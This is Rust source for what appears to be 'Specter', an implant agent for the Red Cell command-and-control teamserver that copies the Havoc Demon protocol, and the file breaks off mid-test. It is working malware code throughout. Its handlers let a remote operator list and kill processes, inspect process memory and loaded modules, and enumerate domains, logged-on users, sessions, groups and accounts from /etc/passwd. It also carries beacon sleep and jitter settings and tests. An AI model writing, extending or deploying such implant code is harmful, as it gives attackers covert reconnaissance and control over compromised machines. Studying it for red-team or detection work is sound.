// ─── COMMAND_PROC_LIST (12) ───────────────────────────────────────────────────

/// Handle a `CommandProcList` task: enumerate all running processes and return
/// the list in the wire format expected by the Red Cell teamserver.
///
/// Incoming payload (LE): `[process_ui: u32]`
///
/// Outgoing payload (LE):
/// `[process_ui: u32]` then per process:
/// `[name: utf16le][pid: u32][is_wow64: u32][ppid: u32][session: u32][threads: u32][user: utf16le]`
fn handle_proc_list(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let process_ui = parse_u32_le(payload, &mut offset).unwrap_or(0);
    let processes = enum_processes();
    let mut response = Vec::new();
    write_u32_le(&mut response, process_ui);
    for p in &processes {
        write_utf16le(&mut response, &p.name);
        write_u32_le(&mut response, p.pid);
        write_u32_le(&mut response, u32::from(p.is_wow64));
        write_u32_le(&mut response, p.ppid);
        write_u32_le(&mut response, p.session_id);
        write_u32_le(&mut response, p.num_threads);
        write_utf16le(&mut response, &p.user);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProcList, response))
}

// ─── COMMAND_PROC / Modules (2) ──────────────────────────────────────────────

/// Handle `CommandProc / Modules`: enumerate loaded modules in a process.
///
/// Incoming args (LE): `[pid: u32]` (0 = current process)
///
/// Outgoing payload (LE):
/// `[subcmd: u32][pid: u32]` then per module: `[name: bytes][base_addr: u64]`
fn handle_proc_modules(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let modules = enum_modules(pid);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, pid);
    for m in &modules {
        write_bytes_le(&mut payload, m.name.as_bytes());
        write_ptr_le(&mut payload, m.base_addr);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Grep (3) ─────────────────────────────────────────────────

/// Handle `CommandProc / Grep`: find processes matching a name substring.
///
/// Incoming args (LE): `[name: bytes (UTF-16LE, length-prefixed)]`
///
/// Outgoing payload (LE):
/// `[subcmd: u32]` then per match:
/// `[name: utf16le][pid: u32][ppid: u32][user: utf16le][arch: u32]`
fn handle_proc_grep(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let name_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcGrep: failed to parse process name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let name = decode_utf16le_null(&name_bytes);
    let matches = grep_processes(&name);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    for m in &matches {
        write_utf16le(&mut payload, &m.name);
        write_u32_le(&mut payload, m.pid);
        write_u32_le(&mut payload, m.ppid);
        write_utf16le(&mut payload, &m.user);
        write_u32_le(&mut payload, m.arch);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Memory (6) ───────────────────────────────────────────────

/// Handle `CommandProc / Memory`: query virtual memory regions of a process.
///
/// Incoming args (LE): `[pid: u32][protection_filter: u32]`
/// (protection_filter == 0 means return all regions)
///
/// Outgoing payload (LE):
/// `[subcmd: u32][pid: u32][protection: u32]` then per region:
/// `[base_addr: u64][region_size: u32][alloc_protect: u32][state: u32][type: u32]`
fn handle_proc_memory(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("ProcMemory: failed to parse pid: {e}");
            return DispatchResult::Ignore;
        }
    };
    let protect_filter = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let regions = query_memory(pid, protect_filter);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, pid);
    write_u32_le(&mut payload, protect_filter);
    for r in &regions {
        write_ptr_le(&mut payload, r.base_addr);
        write_u32_le(&mut payload, r.region_size);
        write_u32_le(&mut payload, r.alloc_protect);
        write_u32_le(&mut payload, r.state);
        write_u32_le(&mut payload, r.mem_type);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Kill (7) ─────────────────────────────────────────────────

/// Handle `CommandProc / Kill`: terminate a process by PID.
///
/// Incoming args (LE): `[pid: u32]`
///
/// Outgoing payload (LE): `[subcmd: u32][success: u32][pid: u32]`
fn handle_proc_kill(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("ProcKill: failed to parse pid: {e}");
            return DispatchResult::Ignore;
        }
    };
    let success = kill_process(pid);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, u32::from(success));
    write_u32_le(&mut payload, pid);
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_NET (2100) ─────────────────────────────────────────────────────

/// Handle a `CommandNet` task: dispatch to the appropriate network-discovery
/// subcommand handler.
///
/// Incoming payload (LE): `[subcommand: u32][...subcommand-specific fields]`
fn handle_net(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandNet: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonNetCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandNet: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandNet dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonNetCommand::Domain => handle_net_domain(),
        DemonNetCommand::Logons => handle_net_logons(rest),
        DemonNetCommand::Sessions => handle_net_sessions(rest),
        DemonNetCommand::Computer => handle_net_name_list(subcmd_raw, rest),
        DemonNetCommand::DcList => handle_net_name_list(subcmd_raw, rest),
        DemonNetCommand::Share => handle_net_share(rest),
        DemonNetCommand::LocalGroup => handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Group => handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Users => handle_net_users(rest),
    }
}

/// `DEMON_NET_COMMAND_DOMAIN` (1): return the DNS domain name of the machine.
///
/// Response payload (LE): `[1: u32][domain_string: len-prefixed bytes]`
fn handle_net_domain() -> DispatchResult {
    let domain = platform_domain_name();
    info!(domain = %domain, "NetDomain");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Domain));
    // Domain uses plain ASCII/UTF-8 string (not UTF-16), matching Havoc's PackageAddString.
    write_bytes_le(&mut payload, domain.as_bytes());

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_LOGONS` (2): enumerate logged-on users.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[2: u32][server_name: UTF-16LE][username: UTF-16LE]…`
fn handle_net_logons(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetLogons: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let users = platform_logged_on_users();
    info!(server = %server, count = users.len(), "NetLogons");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Logons));
    write_utf16le(&mut payload, &server);
    for user in &users {
        write_utf16le(&mut payload, user);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_SESSIONS` (3): enumerate active sessions.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[3: u32][server_name: UTF-16LE][client: UTF-16LE][user: UTF-16LE][time: u32][idle: u32]…`
fn handle_net_sessions(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetSessions: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let sessions = platform_sessions();
    info!(server = %server, count = sessions.len(), "NetSessions");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Sessions));
    write_utf16le(&mut payload, &server);
    for session in &sessions {
        write_utf16le(&mut payload, &session.client);
        write_utf16le(&mut payload, &session.user);
        write_u32_le(&mut payload, session.active_secs);
        write_u32_le(&mut payload, session.idle_secs);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_COMPUTER` (4) / `DEMON_NET_COMMAND_DCLIST` (5): name lists.
///
/// Computer and DcList are stubs in the original Havoc Demon. We implement the
/// wire format so the teamserver can parse a valid (possibly empty) response.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[subcmd: u32][server_name: UTF-16LE][name: UTF-16LE]…`
fn handle_net_name_list(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!(subcmd_raw, "NetNameList: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    info!(server = %server, subcmd = subcmd_raw, "NetNameList (stub)");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_utf16le(&mut payload, &server);
    // Empty list — stubs, matching original Havoc Demon behaviour.

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_SHARE` (6): enumerate network shares.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[6: u32][server_name: UTF-16LE][name: UTF-16LE][path: UTF-16LE][remark: UTF-16LE][permissions: u32]…`
fn handle_net_share(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetShare: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let shares = platform_shares();
    info!(server = %server, count = shares.len(), "NetShare");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Share));
    write_utf16le(&mut payload, &server);
    for share in &shares {
        write_utf16le(&mut payload, &share.name);
        write_utf16le(&mut payload, &share.path);
        write_utf16le(&mut payload, &share.remark);
        write_u32_le(&mut payload, share.permissions);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_LOCALGROUP` (7) / `DEMON_NET_COMMAND_GROUP` (8): group enumeration.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[subcmd: u32][server_name: UTF-16LE][name: UTF-16LE][description: UTF-16LE]…`
fn handle_net_groups(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!(subcmd_raw, "NetGroups: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let groups = platform_groups();
    info!(server = %server, count = groups.len(), subcmd = subcmd_raw, "NetGroups");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_utf16le(&mut payload, &server);
    for group in &groups {
        write_utf16le(&mut payload, &group.name);
        write_utf16le(&mut payload, &group.description);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_USER` (9): enumerate users on a target host.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[9: u32][server_name: UTF-16LE][username: UTF-16LE][is_admin: u32]…`
fn handle_net_users(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetUsers: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let users = platform_users();
    info!(server = %server, count = users.len(), "NetUsers");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Users));
    write_utf16le(&mut payload, &server);
    for user in &users {
        write_utf16le(&mut payload, &user.name);
        write_u32_le(&mut payload, u32::from(user.is_admin));
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

// ─── Net data structures ────────────────────────────────────────────────────

/// An active network session entry (maps to `SESSION_INFO_10` on Windows).
struct NetSession {
    client: String,
    user: String,
    active_secs: u32,
    idle_secs: u32,
}

/// A network share entry (maps to `SHARE_INFO_502` on Windows).
struct NetShare {
    name: String,
    path: String,
    remark: String,
    permissions: u32,
}

/// A group entry with name and description.
struct NetGroup {
    name: String,
    description: String,
}

/// A user entry with an admin flag.
struct NetUser {
    name: String,
    is_admin: bool,
}

// ─── Platform data collection ───────────────────────────────────────────────
//
// These functions gather host-native data.  On Windows the real Win32 Net*
// APIs will be called (future work gated behind `#[cfg(windows)]`).  On
// Linux we use /proc, /etc/passwd, /etc/group, and utmp-style parsing so
// that the handler logic and wire format can be fully tested on CI.

/// Return the DNS domain name of this machine.
fn platform_domain_name() -> String {
    // Try /proc/sys/kernel/domainname first (Linux).
    if let Ok(raw) = std::fs::read_to_string("/proc/sys/kernel/domainname") {
        let trimmed = raw.trim();
        if !trimmed.is_empty() && trimmed != "(none)" {
            return trimmed.to_string();
        }
    }
    // Fallback: try the `hostname` command's domain part.
    if let Ok(output) =
        SysCommand::new("hostname").arg("-d").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let domain = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if !domain.is_empty() {
            return domain;
        }
    }
    String::new()
}

/// Enumerate currently logged-on users.
fn platform_logged_on_users() -> Vec<String> {
    let mut users = Vec::new();
    if let Ok(output) = SysCommand::new("who").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            if let Some(name) = line.split_whitespace().next() {
                if !users.contains(&name.to_string()) {
                    users.push(name.to_string());
                }
            }
        }
    }
    users
}

/// Enumerate active login sessions with timing information.
fn platform_sessions() -> Vec<NetSession> {
    let mut sessions = Vec::new();
    if let Ok(output) = SysCommand::new("who").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                sessions.push(NetSession {
                    client: parts.get(1).unwrap_or(&"").to_string(),
                    user: parts.first().unwrap_or(&"").to_string(),
                    active_secs: 0,
                    idle_secs: 0,
                });
            }
        }
    }
    sessions
}

/// Enumerate network shares (Linux: currently returns empty).
fn platform_shares() -> Vec<NetShare> {
    // On Windows this would call NetShareEnum.  On Linux there is no direct
    // equivalent without Samba — return an empty list.
    Vec::new()
}

/// Enumerate local groups from `/etc/group`.
fn platform_groups() -> Vec<NetGroup> {
    let mut groups = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/group") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if let Some(name) = parts.first() {
                groups.push(NetGroup { name: (*name).to_string(), description: String::new() });
            }
        }
    }
    groups
}

/// Enumerate local users from `/etc/passwd`.
fn platform_users() -> Vec<NetUser> {
    let mut users = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/passwd") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if let Some(name) = parts.first() {
                // UID 0 = root = admin equivalent
                let uid: u32 = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(u32::MAX);
                users.push(NetUser { name: (*name).to_string(), is_admin: uid == 0 });
            }
        }
    }
    users
}

// ─── Payload parsing helpers (server → agent, little-endian) ─────────────────

/// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
fn parse_u32_le(buf: &[u8], offset: &mut usize) -> Result<u32, &'static str> {
    if buf.len() < *offset + 4 {
        return Err("buffer too short for u32 LE");
    }
    let val = u32::from_le_bytes(
        buf[*offset..*offset + 4].try_into().map_err(|_| "slice-to-array conversion failed")?,
    );
    *offset += 4;
    Ok(val)
}

/// Parse a length-prefixed byte slice: `[u32 LE length][bytes…]`.
fn parse_bytes_le(buf: &[u8], offset: &mut usize) -> Result<Vec<u8>, &'static str> {
    let len = parse_u32_le(buf, offset)? as usize;
    if buf.len() < *offset + len {
        return Err("buffer too short for payload bytes");
    }
    let bytes = buf[*offset..*offset + len].to_vec();
    *offset += len;
    Ok(bytes)
}

/// Decode a UTF-16LE byte slice to a `String`, stripping trailing NUL characters.
fn decode_utf16le_null(bytes: &[u8]) -> String {
    let words: Vec<u16> = bytes.chunks_exact(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect();
    String::from_utf16_lossy(&words).trim_end_matches('\0').to_string()
}

// ─── Payload serialisation helpers (agent → server, big-endian) ──────────────
//
// Used by the existing Sleep, Fs, and Exec callbacks which pre-date the LE fix.

/// Append a `u32` in big-endian byte order.
#[cfg(test)]
#[allow(dead_code)]
fn write_u32_be(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_be_bytes());
}

/// Append a length-prefixed byte slice: `[u32 BE length][bytes…]`.
#[cfg(test)]
fn write_bytes_be(buf: &mut Vec<u8>, data: &[u8]) {
    #[allow(clippy::cast_possible_truncation)]
    let len = data.len() as u32;
    buf.extend_from_slice(&len.to_be_bytes());
    buf.extend_from_slice(data);
}

/// Append a `u64` pointer in big-endian byte order (8 bytes).
#[cfg(test)]
fn write_ptr_be(buf: &mut Vec<u8>, v: u64) {
    buf.extend_from_slice(&v.to_be_bytes());
}

/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 BE length][bytes…]`.
#[cfg(test)]
fn write_utf16le_be(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> =
        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    write_bytes_be(buf, &utf16);
}

// ─── Payload serialisation helpers (agent → server, little-endian) ───────────
//
// Used by the process callbacks (CommandProcList / CommandProc) whose fields
// are parsed by the Rust teamserver's `CallbackParser` which reads LE.

/// Append a `u32` in little-endian byte order.
fn write_u32_le(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_le_bytes());
}

/// Append a length-prefixed byte slice: `[u32 LE length][bytes…]`.
fn write_bytes_le(buf: &mut Vec<u8>, data: &[u8]) {
    #[allow(clippy::cast_possible_truncation)]
    let len = data.len() as u32;
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(data);
}

/// Append a `u64` pointer in little-endian byte order (8 bytes).
///
/// Used for base-address fields; the Rust teamserver's `CallbackParser::read_u64` reads 8 bytes LE.
fn write_ptr_le(buf: &mut Vec<u8>, v: u64) {
    buf.extend_from_slice(&v.to_le_bytes());
}

/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 LE length][bytes…]`.
fn write_utf16le(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> =
        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    write_bytes_le(buf, &utf16);
}

// ─── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::demon::DemonPackage;

    // ── Helpers ──────────────────────────────────────────────────────────────

    /// Build a LE-encoded u32 + u32 payload (used for CommandSleep tests).
    fn le_u32_pair(a: u32, b: u32) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&a.to_le_bytes());
        v.extend_from_slice(&b.to_le_bytes());
        v
    }

    /// Build a LE-encoded payload with a single u32 subcommand (for CommandFs/Proc).
    fn le_subcmd(subcmd: u32) -> Vec<u8> {
        subcmd.to_le_bytes().to_vec()
    }

    /// Build a LE length-prefixed UTF-16LE byte payload for a string.
    fn le_utf16le_payload(s: &str) -> Vec<u8> {
        let utf16: Vec<u8> =
            s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
        let mut v = Vec::new();
        v.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        v.extend_from_slice(&utf16);
        v
    }

    /// Build a full Dir request payload (LE-encoded, matching the teamserver write order).
    #[allow(clippy::too_many_arguments)]
    fn dir_request_payload(
        path: &str,
        subdirs: bool,
        files_only: bool,
        dirs_only: bool,
        list_only: bool,
        starts: &str,
        contains: &str,
        ends: &str,
    ) -> Vec<u8> {
        let mut v = le_subcmd(1); // Dir = 1
        v.extend_from_slice(&0u32.to_le_bytes()); // file_explorer = false
        v.extend_from_slice(&le_utf16le_payload(path));
        v.extend_from_slice(&(subdirs as u32).to_le_bytes());
        v.extend_from_slice(&(files_only as u32).to_le_bytes());
        v.extend_from_slice(&(dirs_only as u32).to_le_bytes());
        v.extend_from_slice(&(list_only as u32).to_le_bytes());
        v.extend_from_slice(&le_utf16le_payload(starts));
        v.extend_from_slice(&le_utf16le_payload(contains));
        v.extend_from_slice(&le_utf16le_payload(ends));
        v
    }

    // ── parse_u32_le ─────────────────────────────────────────────────────────

    #[test]
    fn parse_u32_le_reads_correct_value() {
        let buf = [0x01, 0x00, 0x00, 0x00]; // 1 in LE
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("parse"), 1);
        assert_eq!(offset, 4);
    }

    #[test]
    fn parse_u32_le_advances_offset() {
        let buf = [0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00];
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("first"), 1);
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("second"), 2);
    }

    #[test]
    fn parse_u32_le_short_buffer_returns_err() {
        let buf = [0x01, 0x00, 0x00]; // only 3 bytes
        let mut offset = 0;
        assert!(parse_u32_le(&buf, &mut offset).is_err());
    }

    // ── parse_bytes_le ───────────────────────────────────────────────────────

    #[test]
    fn parse_bytes_le_reads_length_prefixed_slice() {
        let data: &[u8] = &[0xAA, 0xBB];
        let mut buf = (data.len() as u32).to_le_bytes().to_vec();
        buf.extend_from_slice(data);
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert_eq!(result, data);
        assert_eq!(offset, 6);
    }

    #[test]
    fn parse_bytes_le_empty_payload_is_ok() {
        let buf = 0u32.to_le_bytes();
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert!(result.is_empty());
    }

    // ── decode_utf16le_null ──────────────────────────────────────────────────

    #[test]
    fn decode_utf16le_null_strips_null_terminator() {
        // "Hi\0" encoded as UTF-16LE
        let encoded: Vec<u8> = "Hi\0".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert_eq!(decode_utf16le_null(&encoded), "Hi");
    }

    #[test]
    fn decode_utf16le_null_handles_empty_slice() {
        assert_eq!(decode_utf16le_null(&[]), "");
    }

    // ── write_utf16le_be ─────────────────────────────────────────────────────

    #[test]
    fn write_utf16le_be_roundtrips_ascii_string() {
        let s = "hello";
        let mut buf = Vec::new();
        write_utf16le_be(&mut buf, s);

        // First 4 bytes: BE length of UTF-16LE bytes (including null terminator)
        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
        let len = u32::from_be_bytes(buf[0..4].try_into().expect("len"));
        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2

        let decoded = decode_utf16le_null(&buf[4..]);
        assert_eq!(decoded, s);
    }

    // ── write_utf16le ────────────────────────────────────────────────────────

    #[test]
    fn write_utf16le_roundtrips_ascii_string() {
        let s = "hello";
        let mut buf = Vec::new();
        write_utf16le(&mut buf, s);

        // First 4 bytes: LE length of UTF-16LE bytes (including null terminator)
        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
        let len = u32::from_le_bytes(buf[0..4].try_into().expect("len"));
        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2

        let decoded = decode_utf16le_null(&buf[4..]);
        assert_eq!(decoded, s);
    }

    // ── handle_sleep ─────────────────────────────────────────────────────────

    #[test]
    fn handle_sleep_updates_config_and_echoes_values() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(3000, 25);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 42, payload);
        let result = dispatch(&package, &mut config);

        assert_eq!(config.sleep_delay_ms, 3000);
        assert_eq!(config.sleep_jitter, 25);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSleep));
        // Payload: [3000 LE][25 LE]
        let expected_delay = 3000u32.to_le_bytes();
        let expected_jitter = 25u32.to_le_bytes();
        assert_eq!(&resp.payload[0..4], &expected_delay);
        assert_eq!(&resp.payload[4..8], &expected_jitter);
    }

    #[test]
    fn handle_sleep_clamps_jitter_to_100() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(1000, 150); // jitter > 100
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        dispatch(&package, &mut config);
        assert_eq!(config.sleep_jitter, 100);
    }

    #[test]
    fn handle_sleep_short_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, vec![0x01]); // too short
        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs pwd ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_pwd_returns_non_empty_path() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(9); // GetPwd = 9
        let package = DemonPackage::new(DemonCommand::CommandFs, 7, payload);
        let result = dispatch(&package, &mut config);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // First 4 bytes LE = subcommand (9)
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 9);

        // Remaining = length-prefixed UTF-16LE path
        assert!(resp.payload.len() > 8, "payload should contain a path");
    }

    // ── handle_fs cd ─────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_cd_changes_directory_and_echoes_path() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let mut payload = le_subcmd(4); // Cd = 4
        payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
        let package = DemonPackage::new(DemonCommand::CommandFs, 8, payload);

        let result = dispatch(&package, &mut config);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 4);

        // Decode echoed path from response
        let path_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let decoded = decode_utf16le_null(&resp.payload[8..8 + path_len]);
        assert_eq!(decoded, tmp_str);
    }

    #[test]
    fn handle_fs_cd_missing_path_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(4); // Cd = 4, but no path bytes follow
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs dir ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_dir_returns_non_empty_listing() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let payload = dir_request_payload(&tmp_str, false, false, false, false, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 9, payload);

        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn handle_fs_dir_list_only_omits_size_and_timestamps() {
        // In list_only mode the response must NOT include is_dir/size/timestamps per entry
        // and must NOT include total_size per dir group.
        let tmp = std::env::temp_dir();
        // Create a known file so we always have at least one entry.
        let test_file = tmp.join("specter_list_only_test.tmp");
        let _ = std::fs::write(&test_file, b"x");

        let mut config = SpecterConfig::default();
        let payload =
            dir_request_payload(&tmp.display().to_string(), false, false, false, true, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 11, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };

        // Parse the response header.
        let p = &resp.payload;
        let mut pos = 0usize;
        let _subcmd = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("subcmd"));
        pos += 4;
        let _file_explorer = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("fe"));
        pos += 4;
        let list_only_flag = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("lo"));
        pos += 4;
        assert_eq!(list_only_flag, 1, "list_only must be echoed as 1");

        // Skip root_path (LE length-prefixed utf16le).
        let path_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("plen")) as usize;
        pos += 4 + path_len;
        let success = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("success"));
        assert_eq!(success, 1);
        pos += 4;

        // Dir group: dir_path, num_files, num_dirs — but NO total_size.
        let gpath_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("gpath")) as usize;
        pos += 4 + gpath_len;
